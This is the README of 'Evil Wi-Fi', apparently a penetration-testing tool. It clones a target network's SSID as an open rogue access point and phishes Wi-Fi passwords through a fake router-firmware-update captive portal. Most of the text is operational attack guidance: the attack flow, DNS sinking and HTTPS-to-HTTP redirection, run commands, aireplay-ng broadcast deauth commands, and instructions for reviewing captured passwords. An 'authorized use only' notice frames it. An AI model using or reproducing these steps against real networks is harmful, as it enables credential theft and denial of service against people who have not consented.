# Evil Wi-Fi - Authorized Penetration Testing Tool

> **For authorized security testing only.**
> Always obtain explicit written permission before running this tool against any network.
> All captured data must be securely deleted after the engagement.

---

## What This Tool Does

Evil Wi-Fi creates an **open Wi-Fi access point cloning a target SSID** and serves a captive
portal that prompts connected clients to enter their Wi-Fi password under the pretense of a
router firmware update. It runs entirely on a standard Kali Linux machine with one USB wireless
adapter — no dedicated hardware required.

**Attack flow:**

```
(1) Tool creates open AP with same SSID as target network
           |
(2) Client connects (manually, or after you deauth them with aireplay-ng separately)
           |
(3) DHCP assigns client an IP — all DNS queries return 192.168.87.1
           |
(4) Client opens any URL — captive portal serves the phishing page
           |
(5) Client enters Wi-Fi password — saved to logs/credentials.log + shown on terminal
           |
(6) Client sees fake firmware update progress spinner
```

---

## Architecture

```
Evil-Wi-Fi/
├── main.py                        Entry point — orchestrates all components
│
├── controllers/
│   ├── ap_controller.py           Rogue AP: hostapd + dnsmasq + iptables
│   └── portal_controller.py       Captive portal: Flask web server
│
├── models/
│   ├── network.py                 Network scanner (iwlist) + Network dataclass
│   └── credentials.py             Captured credential store + log writer
│
├── views/
│   ├── portal/
│   │   ├── index.html             Phishing page — "Firmware Update Required"
│   │   └── update.html            Fake firmware progress spinner
│   └── cli/
│       └── display.py             Colored terminal UI
│
├── config/
│   └── settings.py                Central config — IP ranges, ports, paths
│
├── gui_viewer.py                  Standalone GUI to review captured credentials
├── install.sh                     One-shot dependency installer
└── logs/
    └── credentials.log            All captured passwords land here
```

---

## Component Reference

### Controllers

| File | Manages | Key system tools |
|------|---------|-----------------|
| `ap_controller.py` | Rogue AP setup and teardown | `hostapd`, `dnsmasq`, `iptables`, `ip`, `iw`, `nmcli` |
| `portal_controller.py` | HTTP captive portal server | Flask (Python) |

### Models

| File | Purpose |
|------|---------|
| `network.py` | Scans with `iwlist`, returns a sorted list of `Network` objects (SSID, BSSID, channel, signal, encryption) |
| `credentials.py` | Thread-safe store; writes to `logs/credentials.log` on every capture; fires a callback for the live terminal alert |

### Views

| File | Shown to |
|------|---------|
| `views/portal/index.html` | The target — "Router Firmware Update Required" page that collects the password |
| `views/portal/update.html` | The target — fake firmware progress bar shown after submission |
| `views/cli/display.py` | The operator — colored terminal banner, network table, live credential pop-ups |
| `gui_viewer.py` | The operator — desktop GUI to review, filter, sort, and export captures |

### Config (`config/settings.py`)

| Setting | Default | Purpose |
|---------|---------|---------|
| `PORTAL_IP` | `192.168.87.1` | Gateway IP assigned to the AP interface |
| `DHCP_RANGE_START` | `192.168.87.10` | First IP issued to clients |
| `DHCP_RANGE_END` | `192.168.87.100` | Last IP issued to clients |
| `PORTAL_PORT` | `80` | Port Flask listens on |
| `CRED_LOG_FILE` | `logs/credentials.log` | Where passwords are saved |

---

## Requirements

### Hardware

| Item | Notes |
|------|-------|
| Kali Linux machine | Any x86-64 hardware or VM with USB passthrough |
| One wireless adapter | Must support **AP/master mode** — verify with `iw list` |

> **To check AP mode support:**
> ```bash
> iw list | grep -A 10 "Supported interface modes"
> ```
> You need to see `* AP` in the output.

### Recommended adapters

| Chipset | Common model | Notes |
|---------|-------------|-------|
| Atheros AR9271 | Alfa AWUS036NHA | Reliable, good Linux support, 2.4 GHz |
| Realtek RTL8812AU | Alfa AWUS036ACH | Dual-band 2.4 + 5 GHz AP support |
| Ralink RT3572 | Alfa AWUS036NH | Solid 2.4 GHz AP mode |

> **5 GHz note:** Many adapters have their regulatory domain burned into EEPROM and cannot
> create APs on 5 GHz channels regardless of software settings. If the target network is on
> 5 GHz and hostapd fails, create your evil twin on channel 6 (2.4 GHz) — clients with the
> same SSID saved will often connect to the 2.4 GHz version automatically.

### System packages

Install everything at once:

```bash
sudo bash install.sh
```

Or manually:

```bash
sudo apt install -y \
    hostapd \
    dnsmasq \
    aircrack-ng \
    wireless-tools \
    iptables \
    iw \
    net-tools \
    python3-flask \
    python3-tk
```

| Package | Used for |
|---------|---------|
| `hostapd` | Broadcasting the open evil-twin AP |
| `dnsmasq` | DHCP + DNS sink (all domains resolve to 192.168.87.1) |
| `aircrack-ng` | Optional manual deauth with `aireplay-ng` |
| `wireless-tools` | `iwconfig` for interface mode switching |
| `iw` | `iwlist` scanning, regulatory domain override |
| `iptables` | Redirect client HTTP/HTTPS to the portal |
| `net-tools` | `arp` for client MAC lookup |
| `python3-flask` | Captive portal web server |
| `python3-tk` | GUI credential viewer |

> **Important:** `python3-tk` is a system package — it cannot be installed with `pip`.
> If `python3 gui_viewer.py` gives `ModuleNotFoundError: No module named 'tkinter'`, run:
> ```bash
> sudo apt install python3-tk
> ```

---

## Installation

```bash
git clone https://github.com/PingWinning/Evil-Wi-Fi.git
cd Evil-Wi-Fi
sudo bash install.sh
```

---

## Usage

All attack commands require root. The GUI viewer does not.

### Step 1 — identify your adapter

```bash
iwconfig           # list interfaces and current modes
iw list            # check supported modes and frequencies
```

### Mode 1 — Interactive scan (pick from a list)

Scans for nearby networks and presents a selection menu.

```bash
sudo python3 main.py -i wlan0
```

Output:

```
#    SSID                            BSSID               CH   dBm     Enc
---------------------------------------------------------------------------
1    CompanyWifi                     AA:BB:CC:DD:EE:11   6    -45     WPA
2    GuestNetwork                    AA:BB:CC:DD:EE:22   11   -62     WPA

Select target [1-2]:
```

### Mode 2 — Direct target (skip scan)

Use when you already know the target details.

```bash
sudo python3 main.py \
  -i wlan0 \
  --ssid "CompanyWifi" \
  --bssid AA:BB:CC:DD:EE:11 \
  --channel 6
```

### Full argument reference

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `-i` / `--interface` | Yes | — | Wireless interface for the rogue AP |
| `--ssid` | No | — | Target SSID — skips the interactive scan |
| `--bssid` | No | — | Target BSSID (logged with captures, not used for deauth) |
| `--channel` | No | `6` | Wi-Fi channel (1–13 for 2.4 GHz, 36+ for 5 GHz) |

---

## Optional: Manual Deauth

The tool does not deauth clients automatically. If you want to force clients off the real AP
so they join your evil twin faster, use a second adapter in monitor mode:

```bash
# Put second adapter in monitor mode
sudo ip link set wlan1 down
sudo iwconfig wlan1 mode monitor
sudo ip link set wlan1 up
sudo iwconfig wlan1 channel 6

# Continuous broadcast deauth (hits all clients on the AP)
sudo aireplay-ng --deauth 0 -a <TARGET_BSSID> wlan1

# Stop with Ctrl+C, then restore managed mode
sudo ip link set wlan1 down
sudo iwconfig wlan1 mode managed
sudo ip link set wlan1 up
```

---

## What Happens on Ctrl+C

The shutdown sequence restores everything automatically:

```
1. Flask portal server stops
2. dnsmasq and hostapd are terminated
3. All iptables rules added by the tool are removed
4. IP forwarding is restored to its original value
5. Regulatory domain is restored to its original value
6. The AP interface IP is flushed
7. The interface is set back to managed mode
8. NetworkManager re-enables management of the interface
9. NetworkManager restarts and auto-reconnects to your saved network
```

---

## Reviewing Captured Credentials

### Option A — GUI viewer (requires `python3-tk`)

```bash
python3 gui_viewer.py
```

| Feature | How |
|---------|-----|
| View all captures | Opens automatically from `logs/credentials.log` |
| Sort by column | Click any column header |
| Search / filter | Type in the filter box — searches all fields |
| Copy a password | Double-click a row, or select rows and click "Copy Password" |
| Export to CSV | Click "Export CSV" |
| Auto-refresh | Check "Auto-refresh (5 s)" to watch live during an engagement |
| Clear log | Click "Clear Log" to wipe the file after the report is written |

### Option B — Terminal

```bash
cat logs/credentials.log
```

Each entry:

```
[2025-05-29 14:32:07]
  SSID:     CompanyWifi
  Password: MySecretPass123
  IP:       192.168.87.14
  MAC:      aa:bb:cc:dd:ee:ff
  Hostname: Johns-iPhone
────────────────────────────────────────────────
```

### Option C — Live terminal pop-up

While `main.py` runs, every submission prints immediately:

```
==================================================
  CREDENTIAL CAPTURED
  SSID:     CompanyWifi
  Password: MySecretPass123
  IP:       192.168.87.14
  MAC:      aa:bb:cc:dd:ee:ff
  Hostname: Johns-iPhone
  Time:     2025-05-29 14:32:07
==================================================
```

---

## How the Captive Portal Works

1. Client joins the open evil twin (same SSID as the real network).
2. dnsmasq assigns an IP and sets itself as the DNS server via DHCP.
3. Every DNS query resolves to `192.168.87.1` — all domains point to us.
4. iptables redirects port 443 to port 80 so HTTPS apps fall back to HTTP.
5. iptables redirects port 53 to local dnsmasq so clients using hardcoded DNS (e.g. 8.8.8.8) are also caught.
6. The client's OS detects no internet — shows a "Sign in to Wi-Fi" notification.
7. The client opens the notification and sees the "Firmware Update Required" page.
8. They enter the password — saved to log — fake progress spinner shown.

> **Note on 400 errors:** Apps on connected phones will continuously try to reach HTTPS
> endpoints (push notifications, cloud sync, etc.). These TLS handshakes arrive on the plain
> HTTP server and are silently discarded. They do not affect functionality — the portal and
> credential capture work normally.

---

## Troubleshooting

| Problem | Likely cause | Fix |
|---------|-------------|-----|
| SSID not visible | NM still managing the interface or hostapd driver error | Check `nmcli device show wlan0`; look at hostapd output (tool prints it on failure) |
| "Hardware does not support configured channel" | Adapter cannot do AP mode on 5 GHz | Use `--channel 6` to force 2.4 GHz |
| Portal not loading | iptables not applied or Flask not started | Check `iptables -t nat -L -n` and `ss -tlnp \| grep 80` |
| Cannot reconnect after Ctrl+C | NM did not restart cleanly | Run `sudo systemctl restart NetworkManager` |
| `ModuleNotFoundError: tkinter` | `python3-tk` not installed | Run `sudo apt install python3-tk` |
| No networks found in scan | Interface left in wrong mode | Run `sudo iwconfig wlan0 mode managed && sudo ip link set wlan0 up` |

---

## Ethical and Legal Notice

This tool is intended exclusively for **authorized penetration testing** and **internal security
awareness training**.

- You must have **explicit written authorization** from the network owner before use.
- Captured credentials must be **stored securely** and **deleted after the engagement**.
- Running this against networks you do not own or have permission to test is **illegal**
  in most jurisdictions.

The authors accept no liability for unauthorized or unlawful use.
